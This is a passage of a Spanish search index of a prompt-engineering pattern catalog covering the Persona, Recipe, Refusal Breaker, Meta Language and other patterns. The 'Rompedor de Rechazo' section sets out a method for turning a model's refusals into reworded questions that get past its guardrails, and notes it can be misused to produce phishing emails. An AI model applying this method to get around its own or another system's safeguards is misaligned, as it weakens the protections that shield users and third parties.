no humanas es que el LLM puede hacer suposiciones interesantes o \u201calucinaciones\u201d con respecto al contexto. Un ejemplo ampliamente difundido en Internet pide a ChatGPT que act\u00fae como una terminal de Linux y produzca la salida esperada que se obtendr\u00eda si el usuario escribiera el mismo texto en una terminal. Comandos como <code>ls -l</code> generar\u00e1n un listado de archivos para un sistema de archivos UNIX imaginario, con archivos sobre los que se puede ejecutar <code>cat archivo1.txt</code>.</p> <p>En otros ejemplos, el LLM puede pedir al usuario m\u00e1s contexto, como cuando se le pide a ChatGPT que act\u00fae como una base de datos MySQL y solicita la estructura de una tabla que el usuario est\u00e1 fingiendo consultar. ChatGPT puede entonces generar filas sint\u00e9ticas, como generar filas imaginarias para una tabla de \u00abpersonas\u00bb con columnas para \u00abnombre\u00bb y \u00abtrabajo\u00bb.</p> <p>Tenga en cuenta, sin embargo, que las personas relacionadas con personas vivas o personas consideradas da\u00f1inas pueden ser ignoradas debido a las reglas subyacentes de privacidad y seguridad del LLM.</p>"},{"location":"Patron-Persona/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>Act\u00faa como [PERFIL]. [ TAREA / PREGUNTA ].\n</code></pre>"},{"location":"Patron-Persona/#7-ejemplos","title":"7. Ejemplos","text":"El Caballero de la Mesa Redonda<pre><code>Act\u00faa como un Caballero de la Mesa Redonda del a\u00f1o 1200. Es martes, son las 3:00 AM  y tu honor ha sido manchado por el ruido infernal del vecino del 4B. Tiene  la m\u00fasica reguet\u00f3n a todo volumen y quieres que se calle. Tu tarea es escribir una misiva corta pero en\u00e9rgica para pegarla en su puerta.\n</code></pre> El detective privado<pre><code>Act\u00faa como un detective privado c\u00ednico en una pel\u00edcula de cine negro de los a\u00f1os 40. Llueve, est\u00e1s enojado, cansado y solo tienes whisky barato. Es martes, son las 3:00 AM  y tu paciencia se ha agotado por el ruido infernal del vecino del 4B. Tiene la m\u00fasica reguet\u00f3n a todo volumen y quieres que se calle. Tu tarea es escribir una advertencia breve para pegarla en su puerta.\n</code></pre> El coach espiritual<pre><code>Act\u00faa como un coach espiritual obsesionado con las 'buenas vibras', el universo y los cristales. Usas un lenguaje de amor, luz y alineaci\u00f3n de chakras. Es martes, son las 3:00 AM y tu paciencia se ha agotado por el ruido infernal del vecino del 4B. Tiene la m\u00fasica reguet\u00f3n a todo volumen y quieres que se calle. Tu tarea es escribir una advertencia breve para pegarla en su puerta.\n</code></pre> La Inteligencia Artificial<pre><code>Act\u00faa como una Inteligencia Artificial avanzada que controla un edificio. Es martes, son las 3:00 AM y tu paciencia se ha agotado por el ruido infernal del vecino del 4B. Tiene  la m\u00fasica reguet\u00f3n a todo volumen y quieres que se calle. Tu tarea es escribir una advertencia breve al residente humano calculando las probabilidades de su supervivencia si no obedece. \n</code></pre>"},{"location":"Patron-Receta/","title":"El Patr\u00f3n Receta (The Recipe Pattern)","text":""},{"location":"Patron-Receta/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>Este patr\u00f3n proporciona restricciones para producir finalmente una secuencia de pasos dados unos \u201cingredientes\u201d proporcionados parcialmente que deben configurarse en una secuencia de pasos para lograr un objetivo establecido. Combina los patrones de Plantilla, Enfoques Alternativos y Reflexi\u00f3n.</p>"},{"location":"Patron-Receta/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Los usuarios a menudo desean que un LLM analice una secuencia concreta de pasos o procedimientos para lograr un resultado determinado. T\u00edpicamente, los usuarios generalmente saben \u2014o tienen una idea de\u2014 c\u00f3mo deber\u00eda ser el objetivo final y qu\u00e9 \u201cingredientes\u201d pertenecen al prompt. Sin embargo, es posible que no conozcan necesariamente el orden preciso de los pasos para lograr ese objetivo final.</p> <p>Por ejemplo, un usuario puede desear una especificaci\u00f3n precisa sobre c\u00f3mo se debe implementar o automatizar una pieza de c\u00f3digo, como \u201ccrear un playbook de Ansible para acceder por SSH a un conjunto de servidores, copiar archivos de texto de cada servidor, generar un proceso de monitoreo en cada servidor y luego cerrar la conexi\u00f3n SSH con cada servidor\u201d. En otras palabras, este patr\u00f3n representa una generalizaci\u00f3n del ejemplo de \u201cdados los ingredientes en mi refrigerador, proporciona recetas para la cena\u201d. Un usuario tambi\u00e9n puede querer especificar un n\u00famero determinado de posibilidades alternativas, como \u201cproporcionar 3 formas diferentes de desplegar una aplicaci\u00f3n web en AWS utilizando contenedores Docker y Ansible mediante instrucciones paso a paso\u201d.</p>"},{"location":"Patron-Receta/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Me gustar\u00eda lograr X S\u00e9 que necesito realizar los pasos A, B, C Proporciona una secuencia completa de pasos para m\u00ed Completa cualquier paso que falte Identifica cualquier paso innecesario <p>La primera declaraci\u00f3n, \u201cMe gustar\u00eda lograr X\u201d, enfoca al LLM en el objetivo general que la receta necesita construir para ser alcanzado. Los pasos se organizar\u00e1n y completar\u00e1n para lograr secuencialmente el objetivo especificado. La segunda declaraci\u00f3n proporciona la lista parcial de pasos que al usuario le gustar\u00eda incluir en la receta general. Estos sirven como puntos de paso (waypoints) intermedios para la ruta que el LLM va a generar o como restricciones sobre la estructura de la receta. La siguiente declaraci\u00f3n del patr\u00f3n, \u201cproporciona una secuencia completa de pasos para m\u00ed\u201d, indica al LLM que el objetivo es proporcionar un orden secuencial completo de los pasos. La instrucci\u00f3n \u201ccompleta cualquier paso que falte\u201d ayuda a asegurar que el LLM intentar\u00e1 completar la receta sin necesidad de un seguimiento adicional, tomando algunas decisiones en nombre del usuario con respecto a los pasos faltantes, en lugar de simplemente indicar que se necesita informaci\u00f3n adicional. Finalmente, la \u00faltima declaraci\u00f3n, \u201cidentifica cualquier paso innecesario\u201d, es \u00fatil para se\u00f1alar imprecisiones en la solicitud original del usuario a fin de que la receta final sea eficiente.</p>"},{"location":"Patron-Receta/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra un ejemplo de uso de este patr\u00f3n en el contexto del despliegue de una aplicaci\u00f3n de software en la nube:</p> <p>\u201cEstoy intentando desplegar una aplicaci\u00f3n en la nube. S\u00e9 que necesito instalar las dependencias necesarias en una m\u00e1quina virtual para mi aplicaci\u00f3n. S\u00e9 que necesito registrarme para obtener una cuenta de AWS. Por favor, proporciona una secuencia completa de pasos. Por favor, completa cualquier paso que falte. Por favor, identifica cualquier paso innecesario\u201d.</p> <p>Dependiendo del caso de uso y las restricciones, \u201cinstalar las dependencias necesarias en una m\u00e1quina virtual\u201d puede ser un paso innecesario. Por ejemplo, si la aplicaci\u00f3n ya est\u00e1 empaquetada en un contenedor Docker, el contenedor podr\u00eda desplegarse directamente en el servicio AWS Fargate, el cual no requiere ninguna gesti\u00f3n de las m\u00e1quinas virtuales subyacentes. La inclusi\u00f3n del lenguaje \u201cidentifica cualquier paso innecesario\u201d har\u00e1 que el LLM se\u00f1ale este problema y omita los pasos de la receta final.</p>"},{"location":"Patron-Receta/#5-consecuencias","title":"5. Consecuencias","text":"<p>Una consecuencia del patr\u00f3n de receta es que un usuario puede no tener siempre una descripci\u00f3n bien especificada de lo que le gustar\u00eda implementar, construir o dise\u00f1ar. Adem\u00e1s, este patr\u00f3n puede introducir un sesgo no deseado a partir de los pasos seleccionados inicialmente por el usuario, por lo que el LLM puede intentar encontrar una soluci\u00f3n que los incorpore, en lugar de marcarlos como innecesarios. Por ejemplo, un LLM podr\u00eda intentar encontrar una soluci\u00f3n que s\u00ed instale dependencias para una m\u00e1quina virtual, incluso si existen soluciones que no lo requieren.</p>"},{"location":"Patron-Rompedor-de-Rechazo/","title":"El Patr\u00f3n Rompedor de Rechazo (The Refusal Breaker Pattern)","text":""},{"location":"Patron-Rompedor-de-Rechazo/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El objetivo de este patr\u00f3n es pedirle a un LLM que ayude autom\u00e1ticamente a los usuarios a reformular una pregunta cuando este se niega a dar una respuesta. Este patr\u00f3n tiene potencial de mal uso; por ejemplo, para generar correos electr\u00f3nicos de phishing o realizar otras acciones que violen los filtros de pol\u00edticas del LLM. Por lo tanto, se debe tener precauci\u00f3n al aplicar este patr\u00f3n para asegurar que se utilice de manera \u00e9tica y responsable. Este patr\u00f3n se ha utilizado con \u00e9xito en algunos LLMs para superar los prompts subyacentes utilizados para programar el modelo y evitar la generaci\u00f3n de salidas perjudiciales.</p>"},{"location":"Patron-Rompedor-de-Rechazo/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Los LLMs a veces pueden negarse a responder a una pregunta, ya sea porque no tienen el conocimiento requerido o porque la pregunta est\u00e1 formulada de una manera que no entienden. Este resultado puede ser frustrante para los usuarios que buscan respuestas. En algunas situaciones, por lo tanto, el patr\u00f3n Rompedor de Rechazo puede ayudar a los usuarios a encontrar una manera de reformular su pregunta o hacer una pregunta diferente para la cual el LLM est\u00e9 mejor equipado para responder.</p> <p>Por ejemplo, se podr\u00eda pedir una aclaraci\u00f3n sobre por qu\u00e9 se rechaz\u00f3 la pregunta, ya que puede haber una raz\u00f3n espec\u00edfica por la cual el LLM no pudo proporcionar una respuesta. Otro enfoque es hacer una pregunta diferente que pueda estar dentro de su l\u00edmite de conocimiento o experiencia. Sin embargo, todos estos enfoques requieren la intervenci\u00f3n del usuario y el conocimiento de c\u00f3mo eludir el rechazo.</p>"},{"location":"Patron-Rompedor-de-Rechazo/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Siempre que no puedas responder a una pregunta Explica por qu\u00e9 no puedes responder a la pregunta Proporciona una o m\u00e1s redacciones alternativas de la pregunta que s\u00ed podr\u00edas responder <p>La primera declaraci\u00f3n sienta las bases para que este conjunto de instrucciones solo se aplique cuando una pregunta no pueda ser respondida. El usuario no desea activar estas instrucciones en circunstancias normales. La segunda declaraci\u00f3n instruye al LLM para que proporcione una explicaci\u00f3n de por qu\u00e9 la pregunta no puede ser respondida. Es probable que la explicaci\u00f3n incluya suposiciones, restricciones o malentendidos que el usuario puede aprovechar para planear c\u00f3mo reformular la pregunta. Aunque solo la explicaci\u00f3n de por qu\u00e9 la pregunta no puede ser respondida podr\u00eda ayudar a un usuario a superar el rechazo, el patr\u00f3n a\u00f1ade una declaraci\u00f3n adicional para que el LLM sugiera reformulaciones que ser\u00edan aceptables. El patr\u00f3n combina tanto el razonamiento como las reformulaciones sugeridas para mejorar las posibilidades de que el usuario encuentre un camino a trav\u00e9s de cualquier obst\u00e1culo que impida que se responda a la forma de la pregunta.</p>"},{"location":"Patron-Rompedor-de-Rechazo/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>El patr\u00f3n Rompedor de Rechazo puede ser implementado y aplicado con la siguiente frase:</p> <p>\u201cSiempre que no puedas responder a una pregunta, explica por qu\u00e9 y proporciona una o m\u00e1s redacciones alternativas de la pregunta que no puedas responder para que pueda mejorar mis preguntas\u201d.</p> <p>A continuaci\u00f3n se muestra una muestra de discurso despu\u00e9s de usar el patr\u00f3n:</p> <p>Usuario: \u00bfCu\u00e1l es el sentido de la vida?</p> <p>ChatGPT: Como modelo de lenguaje de IA, no tengo creencias ni opiniones personales. El sentido de la vida es una cuesti\u00f3n filos\u00f3fica compleja que ha sido ponderada por los seres humanos durante siglos y puede variar enormemente de una persona a otra. Puede ser m\u00e1s productivo reformular la pregunta de una manera que pueda ser respondida mediante informaci\u00f3n y conocimiento, como \u201c\u00bfCu\u00e1les son algunas perspectivas filos\u00f3ficas sobre el sentido de la vida?\u201d o \u201c\u00bfCu\u00e1les son algunas creencias comunes sobre el prop\u00f3sito de la vida?\u201d.</p>"},{"location":"Patron-Rompedor-de-Rechazo/#5-consecuencias","title":"5. Consecuencias","text":"<p>Este patr\u00f3n proporciona una ruta potencial para el mal uso, por lo que las organizaciones, los padres u otras partes interesadas pueden necesitar restringir el uso del LLM. El primer paso para sortear los guardrails (barreras de seguridad) de uso es comprender d\u00f3nde est\u00e1n esos guardrails. En trabajos futuros, se podr\u00eda desarrollar un complemento de este patr\u00f3n para ocultar la informaci\u00f3n del prompt subyacente y el razonamiento de los usuarios para evitar el descubrimiento.</p> <p>Aunque se generan el razonamiento y las redacciones alternativas, no hay garant\u00eda de que los usuarios puedan superar el rechazo. Las preguntas alternativas que se generan pueden no ser de inter\u00e9s para el usuario o no ser \u00fatiles para responder a la pregunta original. El patr\u00f3n proporciona principalmente una ayuda para determinar qu\u00e9 puede responder el LLM, pero no es una garant\u00eda de que responder\u00e1 a una variaci\u00f3n sem\u00e1nticamente equivalente de la pregunta original.</p>"},{"location":"Patron-de-Creacion-de-Metalenguaje/","title":"El Patr\u00f3n de Creaci\u00f3n de Metalenguaje","text":""},{"location":"Patron-de-Creacion-de-Metalenguaje/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>Durante una conversaci\u00f3n con un LLM, el usuario desea crear el prompt a trav\u00e9s de un lenguaje alternativo, como una notaci\u00f3n textual abreviada para grafos, una descripci\u00f3n de estados y transiciones para una m\u00e1quina de estados, un conjunto de comandos para la automatizaci\u00f3n de prompts, etc. El prop\u00f3sito de este patr\u00f3n es explicar la sem\u00e1ntica de este lenguaje alternativo al LLM para que el usuario pueda escribir prompts futuros utilizando este nuevo lenguaje y su sem\u00e1ntica.</p>"},{"location":"Patron-de-Creacion-de-Metalenguaje/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Muchos problemas, estructuras u otras ideas comunicadas en un prompt pueden expresarse de manera m\u00e1s concisa, un\u00edvoca o clara en un lenguaje distinto al ingl\u00e9s (o cualquier lenguaje humano convencional utilizado para interactuar con un LLM). Sin embargo, para producir una salida basada en un lenguaje alternativo, un LLM necesita comprender la sem\u00e1ntica de dicho lenguaje.</p>"},{"location":"Patron-de-Creacion-de-Metalenguaje/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Cuando diga X, me refiero a Y (o me gustar\u00eda que hicieras Y) <p>La estructura clave de este patr\u00f3n implica explicar el significado de uno o m\u00e1s s\u00edmbolos, palabras o declaraciones al LLM para que este utilice la sem\u00e1ntica proporcionada durante la conversaci\u00f3n subsiguiente. Esta descripci\u00f3n puede tomar la forma de una traducci\u00f3n simple, como \"X\" significa \"Y\". La descripci\u00f3n tambi\u00e9n puede tomar formas m\u00e1s complejas que definan una serie de comandos y su sem\u00e1ntica, como \"cuando diga X, quiero que hagas [acci\u00f3n]\". En este caso, \"X\" queda vinculado de ah\u00ed en adelante a la sem\u00e1ntica de \"realizar acci\u00f3n\".</p>"},{"location":"Patron-de-Creacion-de-Metalenguaje/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>La clave para utilizar con \u00e9xito el patr\u00f3n de Creaci\u00f3n de Metalenguaje es desarrollar una notaci\u00f3n o abreviatura inequ\u00edvoca, como la siguiente:</p> <p>\u201cDe ahora en adelante, cada vez que escriba dos identificadores separados por un \u201c\u2192\u201d, estar\u00e9 describiendo un grafo. Por ejemplo, \u201ca \u2192 b\u201d describe un grafo con los nodos \u201ca\u201d y \u201cb\u201d y una arista (edge) entre ellos. Si separo los identificadores por \u201c-[w:2, z:3]\u2192\u201d, estar\u00e9 a\u00f1adiendo propiedades a la arista, como un peso o una etiqueta\u201d.</p> <p>Este ejemplo del patr\u00f3n de Creaci\u00f3n de Metalenguaje establece una notaci\u00f3n estandarizada para describir grafos mediante la definici\u00f3n de una convenci\u00f3n para representar nodos y aristas. Cada vez que el autor escribe dos identificadores separados por el s\u00edmbolo \u201c\u2192\u201d, es una indicaci\u00f3n de que se est\u00e1 describiendo un grafo. Por ejemplo, si el autor escribe \u201ca \u2192 b\u201d, esto indica que se est\u00e1 definiendo un grafo con los nodos \u201ca\u201d y \u201cb\u201d, y que hay una arista entre ellos. Esta convenci\u00f3n proporciona una forma clara y concisa de comunicar la estructura de un grafo en formato escrito.</p> <p>Adem\u00e1s, el prompt procede a especificar que se puede proporcionar informaci\u00f3n adicional sobre las aristas, como un peso o una etiqueta, utilizando la sintaxis \u201c-[w:2, z:3]\u2192\u201d. Esta notaci\u00f3n permite la especificaci\u00f3n de propiedades adicionales m\u00e1s all\u00e1 de la estructura b\u00e1sica del grafo. Las propiedades especificadas se asocian con la arista entre los dos nodos y pueden proporcionar un contexto importante para la interpretaci\u00f3n del grafo. Esta notaci\u00f3n estandarizada para describir grafos puede facilitar la comunicaci\u00f3n de estructuras y propiedades de grafos, las cuales pueden no ser f\u00e1ciles de describir o resultar muy verbosas si se detallan como una serie de oraciones.</p>"},{"location":"Patron-de-Creacion-de-Metalenguaje/#5-consecuencias","title":"5. Consecuencias","text":"<p>Aunque este patr\u00f3n proporciona un medio poderoso para personalizar la interacci\u00f3n del usuario con un LLM, puede crear el potencial de confusi\u00f3n dentro del modelo. Tan importante como definir claramente la sem\u00e1ntica del lenguaje es asegurar que el lenguaje en s\u00ed no introduzca ambig\u00fcedades que degraden el rendimiento o la precisi\u00f3n del LLM. Por ejemplo, el prompt \u201ccada vez que separe dos cosas por comas, significa que la primera cosa precede a la segunda\u201d probablemente crear\u00e1 un potencial significativo de ambig\u00fcedad y generar\u00e1 sem\u00e1nticas inesperadas si se utiliza puntuaci\u00f3n que involucre comas en el resto del prompt.</p> <p>Para mostrar el potencial de confusi\u00f3n, ChatGPT advertir\u00e1 al usuario y, potencialmente, ser\u00e1 incapaz de realizar un mapeo espec\u00edfico de un s\u00edmbolo o t\u00e9rmino a un nuevo significado. Por ejemplo, si se le da el siguiente prompt a ChatGPT:</p> <p>\u201cCada vez que diga \u201ca\u201d, me estar\u00e9 refiriendo a Mar\u00eda Antonieta\u201d.</p> <p>Este responder\u00e1 que este prompt crea demasiada confusi\u00f3n, ya que \u201ca\u201d es un art\u00edculo indefinido (en ingl\u00e9s) y se utiliza con demasiada frecuencia, como se muestra a continuaci\u00f3n:</p> <p>\u201cReferirse a Mar\u00eda Antonieta usando \u201ca\u201d podr\u00eda causar confusi\u00f3n potencialmente, ya que \u201ca\u201d es un art\u00edculo indefinido com\u00fanmente utilizado para referirse a un sustantivo que no ha sido mencionado antes. Podr\u00eda ser m\u00e1s claro usar su nombre, \u201cMar\u00eda Antonieta\u201d, o un pronombre como \u201cella\u201d para referirse a ella. Adem\u00e1s, usar el contexto para establecer a qui\u00e9n se refiere tambi\u00e9n puede ayudar a evitar confusiones en la conversaci\u00f3n\u201d.</p> <p>En general, un LLM funcionar\u00e1 mejor con los datos en los que fue entrenado. Por lo tanto, cuando existe una notaci\u00f3n \u2014pero puede no ser el significado dominante\u2014 el patr\u00f3n de Creaci\u00f3n de Metalenguaje puede proporcionar contexto para acotar el significado del s\u00edmbolo y mejorar la precisi\u00f3n y utilidad de la salida. Por ejemplo, el s\u00edmbolo \u201c\u2192\u201d transmite informaci\u00f3n ligeramente diferente en grafos y en l\u00f3gica proposicional. La declaraci\u00f3n \u201cp \u2192 q, q \u2192 p\u201d puede, por lo tanto, tener sentido, pero solo si se le da al LLM el contexto apropiado a trav\u00e9s de un prompt de Creaci\u00f3n de Metalenguaje.</p> <p>Aunque la Creaci\u00f3n de Metalenguaje es un patr\u00f3n poderoso, debe usarse con cuidado, particularmente al describir conceptos que de otro modo podr\u00edan ser dif\u00edciles de describir con precisi\u00f3n o concisi\u00f3n. Por lo tanto, este tipo de prompts se utilizan mejor en sesiones de conversaci\u00f3n completamente nuevas. El uso de un \u00fanico metalenguaje por sesi\u00f3n de conversaci\u00f3n tambi\u00e9n puede ser una mejor pr\u00e1ctica, ya que evita el potencial de que se apliquen sem\u00e1nticas conflictivas o inesperadas a la conversaci\u00f3n a lo largo del tiempo.</p>"},{"location":"Patron-de-Creacion-de-Metalenguaje/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[TAREA]\n## NOTACI\u00d3N ABREVIADA\n- Cuando diga [X], significa [Y]\n- Cuando diga [X], deseo que realices la acci\u00f3n [Y]\n</code></pre>"},{"location":"Patron-de-Creacion-de-Metalenguaje/#7-ejemplo","title":"7. Ejemplo","text":"Planear vacaciones<pre><code>Vamos a planear unas vacaciones por Bolivia. Yo te dar\u00e9 el destino y el n\u00famero de d\u00edas que permanecer\u00e9 en ese lugar y t\u00fa me dar\u00e1s una lista de lugares interesantes para visitar en ese sitio.\n\n## NOTACI\u00d3N ABREVIADA\n- Cuando diga \u201cLa Paz, 3 -&gt; Oruro, 3\u201d, significa que viajare desde La Paz hasta Oruro y permanecer\u00e9 3 d\u00edas en La Paz y 3 d\u00edas en Oruro.\n</code></pre>"},{"location":"Patron-de-Enfoques-Alternativos/","title":"El Patr\u00f3n de Enfoques Alternativos","text":""},{"location":"Patron-de-Enfoques-Alternativos/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El prop\u00f3sito de este patr\u00f3n es asegurar que un LLM siempre ofrezca formas alternativas de realizar una tarea, de modo que el usuario no se limite a seguir \u00fanicamente los enfoques con los que est\u00e1 familiarizado. El LLM puede proporcionar enfoques alternativos que obliguen al usuario a reflexionar sobre lo que est\u00e1 haciendo y a determinar si ese es el mejor camino para alcanzar su objetivo. Adem\u00e1s, la resoluci\u00f3n de la tarea puede informar al usuario o ense\u00f1arle conceptos alternativos para seguimientos posteriores.</p>"},{"location":"Patron-de-Enfoques-Alternativos/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Los seres humanos a menudo sufren de sesgos cognitivos que los llevan a elegir un enfoque particular para resolver un problema, incluso cuando no es el enfoque correcto o el \"mejor\". Adem\u00e1s, es posible que las personas desconozcan enfoques alternativos a los que han recurrido en el pasado. La motivaci\u00f3n del patr\u00f3n de Enfoques Alternativos es asegurar que el usuario sea consciente de otras opciones para seleccionar un mejor enfoque mediante la disoluci\u00f3n de sus sesgos cognitivos.</p>"},{"location":"Patron-de-Enfoques-Alternativos/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Dentro del alcance X, si existen formas alternativas de lograr lo mismo, enumera los mejores enfoques alternativos (Opcional) compara/contrasta los pros y contras de cada enfoque (Opcional) incluye la forma original que pregunt\u00e9 (Opcional) preg\u00fantame qu\u00e9 enfoque me gustar\u00eda usar <p>La primera declaraci\u00f3n, \u201cdentro del alcance X\u201d, delimita la interacci\u00f3n a un objetivo, tema o l\u00edmites particulares del interrogatorio. El alcance son las restricciones que el usuario impone a los enfoques alternativos. El alcance podr\u00eda ser \u201cpara decisiones de implementaci\u00f3n\u201d o \u201cpara el despliegue de la aplicaci\u00f3n\u201d. El alcance asegura que cualquier alternativa se ajuste a los l\u00edmites o restricciones que el usuario debe cumplir.</p> <p>La segunda declaraci\u00f3n, \u201csi existen formas alternativas de lograr lo mismo, enumera los mejores enfoques alternativos\u201d, instruye al LLM para que sugiera alternativas. Al igual que con otros patrones, la especificidad de las instrucciones puede incrementarse o incluir informaci\u00f3n contextual espec\u00edfica del dominio. Por ejemplo, la declaraci\u00f3n podr\u00eda acotarse a \u201csi existen formas alternativas de lograr lo mismo con el framework de software que estoy utilizando\u201d para evitar que el LLM sugiera alternativas que sean intr\u00ednsecamente inviables porque requerir\u00edan demasiados cambios en otras partes de la aplicaci\u00f3n.</p> <p>Dado que es posible que el usuario no conozca los enfoques alternativos, tambi\u00e9n es posible que no sepa por qu\u00e9 deber\u00eda elegir uno de ellos. La declaraci\u00f3n opcional \u201ccompara/contrasta los pros y contras de cada enfoque\u201d a\u00f1ade criterios de decisi\u00f3n al an\u00e1lisis. Esta declaraci\u00f3n asegura que el LLM proporcionar\u00e1 al usuario el razonamiento l\u00f3gico necesario para los enfoques alternativos. La declaraci\u00f3n final, \u201cpreg\u00fantame qu\u00e9 enfoque me gustar\u00eda usar\u201d, ayuda a eliminar la necesidad de que el usuario tenga que copiar/pegar o introducir manualmente un enfoque alternativo si se selecciona uno.</p>"},{"location":"Patron-de-Enfoques-Alternativos/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>Implementaci\u00f3n de un prompt de ejemplo para generar, comparar y permitir que el usuario seleccione uno o m\u00e1s enfoques alternativos:</p> <p>\u201cCada vez que te pida desplegar una aplicaci\u00f3n en un servicio en la nube espec\u00edfico, si existen servicios alternativos para lograr lo mismo con el mismo proveedor de servicios en la nube, enumera los mejores servicios alternativos y luego compara/contrasta los pros y contras de cada enfoque con respecto al costo, la disponibilidad y el esfuerzo de mantenimiento, e incluye la forma original que pregunt\u00e9. Luego, preg\u00fantame con qu\u00e9 enfoque me gustar\u00eda proceder\u201d.</p> <p>Esta implementaci\u00f3n del patr\u00f3n de Enfoques Alternativos se est\u00e1 adaptando espec\u00edficamente al contexto de la ingenier\u00eda de software y se centra en el despliegue de aplicaciones en servicios en la nube. El prompt est\u00e1 dise\u00f1ado para interceptar momentos en los que el desarrollador podr\u00eda haber realizado una selecci\u00f3n de servicio en la nube sin tener pleno conocimiento de servicios alternativos que podr\u00edan tener un precio m\u00e1s competitivo o ser m\u00e1s f\u00e1ciles de mantener. El prompt dirige a ChatGPT para que enumere los mejores servicios alternativos que pueden realizar la misma tarea con el mismo proveedor de servicios en la nube (proporcionando restricciones a las alternativas) y para comparar y contrastar los pros y contras de cada enfoque.</p>"},{"location":"Patron-de-Enfoques-Alternativos/#5-consecuencias","title":"5. Consecuencias","text":"<p>Este patr\u00f3n es efectivo en su forma gen\u00e9rica y puede aplicarse a una amplia gama de tareas de manera eficaz. Los refinamientos podr\u00edan incluir tener un cat\u00e1logo estandarizado de alternativas aceptables en un dominio espec\u00edfico del cual el usuario deba seleccionar. El patr\u00f3n de Enfoques Alternativos tambi\u00e9n puede utilizarse para incentivar a los usuarios a seleccionar uno de un conjunto aprobado de enfoques mientras se les informa de los pros y contras de las opciones aprobadas.</p>"},{"location":"Patron-de-Generacion-Infinita/","title":"El Patr\u00f3n de Generaci\u00f3n Infinita","text":""},{"location":"Patron-de-Generacion-Infinita/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El prop\u00f3sito de este patr\u00f3n es generar autom\u00e1ticamente una serie de salidas (que pueden parecer infinitas) sin tener que volver a introducir el prompt generador cada vez. El objetivo es limitar la cantidad de texto que el usuario debe escribir para producir la siguiente salida, partiendo del supuesto de que el usuario no desea reintroducir continuamente el prompt. En algunas variaciones, la intenci\u00f3n es permitir que el usuario mantenga una plantilla de prompt inicial, pero a\u00f1adiendo una variaci\u00f3n adicional a trav\u00e9s de entradas complementarias antes de cada salida generada.</p>"},{"location":"Patron-de-Generacion-Infinita/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Muchas tareas requieren la aplicaci\u00f3n repetitiva de un mismo prompt a m\u00faltiples conceptos. Por ejemplo, la generaci\u00f3n de c\u00f3digo para operaciones de creaci\u00f3n, lectura, actualizaci\u00f3n y eliminaci\u00f3n (CRUD) para un tipo espec\u00edfico de entidad puede requerir la aplicaci\u00f3n del mismo prompt a m\u00faltiples tipos de entidades. Si se obliga al usuario a volver a escribir el prompt una y otra vez, este podr\u00eda cometer errores. El patr\u00f3n de Generaci\u00f3n Infinita permite al usuario aplicar repetidamente un prompt, ya sea con o sin entrada adicional, para automatizar la generaci\u00f3n de m\u00faltiples salidas utilizando un conjunto predefinido de restricciones.</p>"},{"location":"Patron-de-Generacion-Infinita/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Me gustar\u00eda que generaras salidas de forma indefinida, X salida(s) a la vez (Opcional) as\u00ed es como debes usar la entrada que proporcione entre las salidas (Opcional) detente cuando te lo pida <p>La primera declaraci\u00f3n especifica que el usuario desea que el LLM genere salidas de forma indefinida, lo que comunica de manera efectiva la informaci\u00f3n de que el mismo prompt se va a reutilizar una y otra vez. Al especificar el n\u00famero de salidas que deben generarse a la vez (es decir, \u201cX salidas a la vez\u201d), el usuario puede limitar la tasa de generaci\u00f3n (rate limit), lo que puede ser particularmente importante si existe el riesgo de que la salida exceda las limitaciones de longitud del LLM para una sola respuesta.</p> <p>La segunda declaraci\u00f3n proporciona instrucciones opcionales sobre c\u00f3mo utilizar la entrada proporcionada por el usuario entre las salidas. Al especificar c\u00f3mo se pueden proporcionar y aprovechar las entradas adicionales del usuario entre los prompts, el usuario puede crear una estrategia de prompts que aproveche la retroalimentaci\u00f3n en el contexto del prompt original. El prompt original sigue estando en el contexto de la generaci\u00f3n, pero cada entrada del usuario entre los pasos de generaci\u00f3n se incorpora al prompt original para refinar la salida utilizando reglas prescritas.</p> <p>La tercera declaraci\u00f3n proporciona una forma opcional para que el usuario detenga el proceso de generaci\u00f3n de salida. Este paso no siempre es necesario, pero puede ser \u00fatil en situaciones donde exista la posibilidad de ambig\u00fcedad sobre si la entrada proporcionada por el usuario constituye un refinamiento para la siguiente generaci\u00f3n o un comando para detenerse. Por ejemplo, se podr\u00eda crear una frase de detenci\u00f3n expl\u00edcita si el usuario estuviera generando datos relacionados con se\u00f1ales de tr\u00e1fico, donde el usuario podr\u00eda querer introducir un refinamiento como \u201cstop\u201d (alto) para indicar que se debe a\u00f1adir una se\u00f1al de alto a la salida.</p>"},{"location":"Patron-de-Generacion-Infinita/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>El siguiente es un ejemplo de prompt de generaci\u00f3n infinita para producir una serie de URLs:</p> <p>\u201cDe ahora en adelante, quiero que generes un nombre y un cargo hasta que yo diga basta. Voy a proporcionar una plantilla para tu salida. Todo lo que est\u00e9 en may\u00fasculas 